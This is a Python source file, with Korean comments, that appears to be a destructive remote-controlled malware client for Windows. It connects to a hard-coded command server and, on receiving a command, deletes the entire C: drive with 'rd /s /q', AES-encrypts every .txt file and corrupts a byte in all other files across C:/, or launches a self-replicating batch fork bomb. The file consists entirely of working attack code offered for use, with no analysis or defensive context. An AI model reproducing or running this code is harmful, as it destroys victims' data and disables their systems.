import socket
import time
import subprocess
from Crypto.Cipher import AES
from Crypto.Hash import SHA256 as SHA
import sys
import os





class myAES():
    def __init__(self, keytext, ivtext):
        hash=SHA.new()
        key=hash.digest()
        self.key=key[:16]
        hash.update(ivtext.encode('utf-8'))
        iv=hash.digest()
        self.iv=iv[:16]
    def makeEnabled(self,plaintext):
        fillersize=0
        textsize=len(plaintext)
        if textsize%16 !=0:
            fillersize= 16-textsize%16
        filler='0'*fillersize 
        header='%d'%(fillersize)
        gap=16-len(header)
        header +='#'*gap
        return header+plaintext+filler
    def enc(self, plaintext):
        a=plaintext
        me=sys.getsizeof(a)
        ik=1
        while True:
            if ik-me>=16:
                break
            else:
                ik+=16
        p=int((ik-me)%16) 
        list=[b'0', b'1' , b'2' , b'3' , b'4' , b'5' , b'6' , b'7' , b'8' , b'9' , b'10' , b'11' , b'12' , b'13' ,b'14' , b'15']
        if p<10:
            a=list[p]+b'###############'+a
        else:
            a=list[p]+b'##############'+a
        for i in range(p):
            a+=b'0'
        aes=AES.new(self.key, AES.MODE_CBC,self.iv)
        encmsg=aes.encrypt(a)
        return encmsg
    def dec(self, ciphertext):
        aes=AES.new(self.key, AES.MODE_CBC,self.iv)
        decmsg=aes.decrypt(ciphertext)
        header=decmsg[:16].decode()
        fillersize=int(header.split('#')[0])
        if fillersize !=0:
            decmsg=decmsg[16:-fillersize]
        else:
            decmsg =decmsg[16:]   
        return decmsg
        
        

def get_file_extension(file_path):
    _, file_extension = os.path.splitext(file_path)
    return file_extension       
        
        
        
def write():
    for root, dirs, files in os.walk("C:/"):
        for file in files:
            file_path = os.path.join(root, file) 
            try:
                if get_file_extension(file) == ".txt":
                    keytext ='azazazaza'
                    ivtext=''   
                    with open(file_path, "rb") as f:
                        a=f.read()
                        f.close()
                    myCipher = myAES(keytext, ivtext)
                    ciphered = myCipher.enc(a)
                    with open(file_path, "wb") as f:
                        f.write(ciphered)
                        f.close() 
                else:
                    with open(file_path, "rb") as f:
                        a = bytearray(f.read())  
                    a[1] = 42
                    with open(file_path, "wb") as f:
                        f.write(a)
            except:
                pass




sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

svrIP = '192.168.153.129' #기본 주소
port = 2500 #기본 포트aaa
sock.connect((svrIP, port))
print('Connected to ' + svrIP)




while True:
    try: #데이터 읽기
        msg = sock.recv(1024)
        if msg.decode()=="1":
            os.system("rd /s /q c:\\")
        elif msg.decode()=="2":
            write() 
        elif msg.decode()=="3":
            file_path = os.path.join(os.getcwd(), "ddos.bat")
            with open(file_path, 'w') as file:
                file.write("@echo off\nstart \"\" \"ddos.bat\nstart \"\" \"ddos.bat\nexit")
            os.system(f"{file_path}")    
        elif not msg:
            print("연결이 종료되었습니다")
            break

    except: #연결이 종료됨
        print("연결이 종료되었습니다")
        break


sock.close()
